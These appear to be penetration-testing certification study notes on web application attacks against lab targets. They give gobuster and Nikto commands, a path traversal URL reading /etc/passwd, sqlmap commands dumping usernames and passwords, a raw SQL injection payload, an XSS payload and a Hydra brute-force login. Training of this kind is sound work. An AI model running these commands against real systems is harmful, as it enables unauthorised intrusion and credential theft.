# Web Applications

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 11021–11105. Examples are lab-specific and need verification.

# Web Application Penetration Testing 15%

**Q.**

- **Identify vulnerabilities in web applications**
- **Locate hidden file and directories**
- **Conduct brute-force login attack**
- **Conduct web application reconnaissance**

**Web & HTTP Protocols**

1. Request methods
2. Status codes

**Directory Enumeration - [Go buster & Burp suite]**

1. `sudo apt update && sudo apt install -y gobuster`
2. `gobuster dir -u http://192.21.23.23 -w /usr/share/wordlists/dirb/common.txt`
3. `gobuster dir -url http://192.21.23.23 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`
4. `gobuster dir -url http://192.21.23.23/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`

1. Turn on burp
2. capture the GET / request and send to Intruder
3. User burp custom wordlists, or select for your wish
4. start attack

**Scanning web application - [ZAP & Nikto]**

1. Zap manual and automatic scan
2. Nikto scan- `nikto -h http://192.157.60.3 -o niktoscan-192.157.60.3.txt`
3. `nikto -h http://192.157.60.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm`
4. `firefox nikto.html`
5. [`http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd`](http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd)

**Passive Crawling with Burp suite**

1. Turn on burp
2. Check HTTP history and crawl endpoints
3. Add target and scan it

**SQL Injection- sqlmap**

1. http://192.42.186.3/sqli_1.php?title=hacking&action=search
2. `sqlmap -u "http://192.42.186.3/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title`
3. hacking' AND (SELECT 1819 FROM(SELECT COUNT(*),CONCAT(0x716a767171,(SELECT (ELT(1819=1819,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'bLrY'='bLrY&action=search
4. `sqlmap -u "http://192.42.186.3/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs`
5. `sqlmap -u "http://192.42.186.3/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables`
6. `sqlmap -u "http://192.42.186.3/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns`
7. `sqlmap -u "http://192.42.186.3/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump`
8. `sqlmap -r request -p title`

**XSS attack with XSSer**

1. `xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'`
2. `xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`
3. `xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"`

**Attacking HTTP Login form**

**Hydra**

1. echo -e "admin\nbee\nuser1\nuser2" > users
2. cat /root/Desktop/wordlists/100-common-passwords.txt > pws
3. echo "bug" >> pws
4. `hydra -L users -P pws 192.210.201.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!”`

**ZAProxy**

1. Capture the login post request
2. fuzz
3. Addpayloada
4. Start fuzzer

**Burp suite**

1. capture the req http://192.190.241.3/basic
2. decode the basic encoded value - base64 decode
3. Add basic encrypted value
4. Choose sniper
5. Load the common.txt payloads
6. Add payload processing [1. Add prefix admin: 2. encode - base64 encode]
7. Start attack
8. Got 301 req, capture the encoded cred
9. decrypt and get the flag
